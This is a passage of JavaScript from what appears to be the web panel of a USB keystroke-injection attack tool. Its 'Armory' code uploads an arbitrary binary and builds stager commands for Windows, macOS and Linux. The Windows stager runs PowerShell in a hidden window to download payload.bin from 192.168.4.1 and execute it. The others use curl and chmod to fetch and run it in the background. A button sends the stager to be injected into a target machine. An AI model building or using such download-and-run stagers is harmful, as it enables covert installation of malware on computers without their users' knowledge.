    if (e.target !== _binaryFileInput) _binaryFileInput?.click();
  });
  _uploadZone.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      _binaryFileInput?.click();
    }
  });
  _uploadZone.addEventListener('dragover', (e) => {
    e.preventDefault();
    _uploadZone.classList.add('upload-zone--dragover');
  });
  _uploadZone.addEventListener('dragleave', () => {
    _uploadZone.classList.remove('upload-zone--dragover');
  });
  _uploadZone.addEventListener('drop', (e) => {
    e.preventDefault();
    _uploadZone.classList.remove('upload-zone--dragover');
    const file = e.dataTransfer?.files[0];
    if (file) void _setSelectedFile(file);
  });
}

_binaryFileInput?.addEventListener('change', () => {
  const file = _binaryFileInput.files?.[0];
  if (file) void _setSelectedFile(file);
});

document
  .getElementById('inject-os')
  ?.addEventListener('change', _updateArmorySnippet);

function _updateArmorySnippet() {
  const os = document.getElementById('inject-os')?.value || 'windows';
  const url = 'http://192.168.4.1/static/payload.bin';
  let cmd = '';
  if (os === 'windows') {
    cmd = `powershell -w hidden -c "iwr ${url} -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"`;
  } else if (os === 'macos') {
    cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
  } else {
    cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
  }
  const snippetEl = document.getElementById('armory-snippet');
  const codeEl = document.getElementById('armory-snippet-code');
  if (codeEl) codeEl.textContent = cmd;
  if (snippetEl) snippetEl.hidden = false;
}

function setArmoryBinaryReady(name) {
  const badge = document.getElementById('armory-badge');
  if (badge) {
    badge.textContent = name;
    badge.hidden = false;
  }
  const btn = document.getElementById('inject-binary-btn');
  if (btn) btn.disabled = false;
}

function _setArmoryNotice(message, type) {
  const el = document.getElementById('armory-notice');
  if (!el) return;
  el.textContent = message;
  el.className = `armory__notice notice notice--${type === 'quiet' ? 'quiet' : type}`;
  if (!message) el.className = 'armory__notice notice notice--hidden';
}

document
  .getElementById('upload-binary-btn')
  ?.addEventListener('click', async () => {
    if (!_selectedFile) return;
    const validationError = await _validateArmoryFile(_selectedFile);
    if (validationError) {
      _setArmoryNotice(validationError, 'error');
      return;
    }
    const progressEl = document.getElementById('upload-progress');
    const progressBar = document.getElementById('upload-progress-bar');
    const uploadBtn = document.getElementById('upload-binary-btn');
    if (progressEl) progressEl.hidden = false;
    if (progressBar) progressBar.style.width = '0%';
    _setArmoryNotice('Uploading…', 'quiet');
    if (uploadBtn) uploadBtn.disabled = true;

    await new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '/api/upload_binary', true);
      xhr.setRequestHeader('Content-Type', 'application/octet-stream');
      xhr.setRequestHeader('X-Filename', _selectedFile.name);

      xhr.upload.addEventListener('progress', (e) => {
        if (e.lengthComputable && progressBar) {
          progressBar.style.width = `${Math.round((e.loaded / e.total) * 100)}%`;
        }
      });

      xhr.addEventListener('load', () => {
        if (progressEl) progressEl.hidden = true;
        let data = {};
        try {
          data = JSON.parse(xhr.responseText);
        } catch (_) {}
        if (xhr.status === 200) {
          _setArmoryNotice(data.message || 'Upload complete.', 'success');
          setArmoryBinaryReady(data.filename || _selectedFile.name);
        } else {
          _setArmoryNotice(data.message || 'Upload failed.', 'error');
          if (uploadBtn) uploadBtn.disabled = false;
        }
        resolve();
      });

      xhr.addEventListener('error', () => {
        if (progressEl) progressEl.hidden = true;
        _setArmoryNotice('Upload failed — connection error.', 'error');
        if (uploadBtn) uploadBtn.disabled = false;
        resolve();
      });

      xhr.send(_selectedFile);
    });
  });

document
  .getElementById('inject-binary-btn')
  ?.addEventListener('click', async () => {
    const os = document.getElementById('inject-os')?.value || 'windows';
    const btn = document.getElementById('inject-binary-btn');
    if (btn) btn.disabled = true;
    _setArmoryNotice('Injecting stager…', 'quiet');
    try {
      const result = await requestJson('/api/inject_binary', {
        method: 'POST',
        body: JSON.stringify({ os }),
      });
      _setArmoryNotice(
        result.message || 'Injected.',
        result.notice || 'success',
      );
      setBoundText('hid_state', 'Ready');
      if (result.run_history) renderRunHistory(result.run_history);
    } catch (err) {
      _setArmoryNotice(err.message || 'Injection failed.', 'error');
      if (err.data?.run_history) renderRunHistory(err.data.run_history);
    } finally {
      if (btn) btn.disabled = false;
    }
  });
